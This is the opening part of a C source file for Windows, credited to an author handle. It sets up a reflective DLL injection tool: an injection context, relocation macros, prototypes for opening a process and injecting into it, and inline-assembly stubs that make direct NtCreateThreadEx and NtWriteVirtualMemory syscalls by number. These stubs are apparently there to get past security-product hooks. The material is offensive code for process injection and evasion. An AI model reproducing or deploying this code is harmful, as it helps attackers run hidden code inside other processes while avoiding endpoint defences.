/*
    author: 
    hasbiyama (@3xploitZero)
    github.com/hasbiyama

*/

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <winternl.h>

typedef HINSTANCE(WINAPI* LoadLibFunc)(const char* libName);
typedef UINT_PTR(WINAPI* GetProcAddrFunc)(HINSTANCE hModule, const char* procName);
typedef BOOL(WINAPI* DllEntryPointFunc)(void* hDll, DWORD reason, void* reserved);

typedef struct {
    LoadLibFunc loadLibraryFunction;
    GetProcAddrFunc getProcAddressFunction;
    HINSTANCE dllModuleHandle;
} InjectionContext;

typedef struct {
    char* functionName;
    DWORD functionAddress;
} FunctionInfo;

typedef struct {
    unsigned int syscallNum;
    LPBYTE functionAddress;
    LPBYTE hNtDllEnd;
} SyscallInfo;

#ifdef _WIN64
#define RELOCATION_CONDITION(relocationInfo) ((relocationInfo >> 0xC) == IMAGE_REL_BASED_DIR64)
#else
#define RELOCATION_CONDITION(relocationInfo) ((relocationInfo >> 0xC) == IMAGE_REL_BASED_HIGHLOW)
#endif

#define LOG_ERROR(fmt, ...) fprintf(stderr, "\n[-] " fmt "\n", __VA_ARGS__)
#define LOG_INFO(fmt, ...)  printf("[+] " fmt "\n", __VA_ARGS__)

BOOL allocateExecute(HANDLE targetProcessHandle, BYTE* dllData, SIZE_T dllSize);
void __stdcall relocateFindEntry(BYTE* imageBase);
DWORD displayError(const char* errorMessage);
DWORD openInject(DWORD pid);

/* ================ SYSCALL-RELATED FUNCs ================ */

VOID movRCX() { 
    __asm__(
        "mov r10, rcx"); 
}

VOID sysInstruc() {
    __asm__(
        "syscall\n"    // Perform the syscall
        "ret\n"        // Return from function
    );
}

__declspec(naked) NTSTATUS __cdecl SysNtCreateThreadEx(

    PHANDLE                 hThread,
    ACCESS_MASK             DesiredAccess,
    POBJECT_ATTRIBUTES      ObjectAttributes,
    HANDLE                  ProcessHandle, 
    LPTHREAD_START_ROUTINE  lpStartAddress,
    LPVOID                  lpParameter,
    BOOL                    CreateSuspended,
    ULONG                   StackZeroBits,
    ULONG                   SizeOfStackCommit,
    ULONG                   SizeOfStackReserve,
    LPVOID                  lpBytesBuffer,
    LPBYTE                  funcAddr,
    unsigned int            syscallNum,
    LPBYTE                  p)

{
    __asm__(
        "call %[funcAddr]\n"
        "mov eax, %[syscallNum]\n"
        "jmp %[p]"
        : // output operands
        : [funcAddr] "r" (funcAddr), [syscallNum] "m" (syscallNum), [p] "m" (p) // input operands
    );
}

__declspec(naked) NTSTATUS __cdecl SysNtWriteVirtualMemory(
    HANDLE          ProcessHandle,
    PVOID           BaseAddress,
    PVOID           Buffer,
    ULONG           NumberOfBytesToWrite,
    PULONG          NumberOfBytesWritten,
    LPBYTE          funcAddr,
    unsigned int    syscallNum,
    LPBYTE          p)
{
    __asm__ __volatile__ (
        "call %[funcAddr]\n"
        "mov eax, %[syscallNum]\n"
        "jmp %[p]"
        : // output operands
        : [funcAddr] "r" (funcAddr), [syscallNum] "m" (syscallNum), [p] "m" (p) // input operands
    );
}

int compareFunctionInfo(const void* a, const void* b) {
    const FunctionInfo* fa = (const FunctionInfo*)a;
    const FunctionInfo* fb = (const FunctionInfo*)b;
    if (fa->functionAddress < fb->functionAddress) {
        return -1;
    } else if (fa->functionAddress > fb->functionAddress) {
        return 1;
    } else {
        return 0;
    }
}

/* ================ GENERAL HELPER FUNCs ================ */ 

// Display error and return the associated error code
DWORD displayError(const char* errorMessage) {
    DWORD errorCode = GetLastError();
    LOG_ERROR("Error: %s. Error Code: %lu", errorMessage, errorCode);
    return errorCode;
}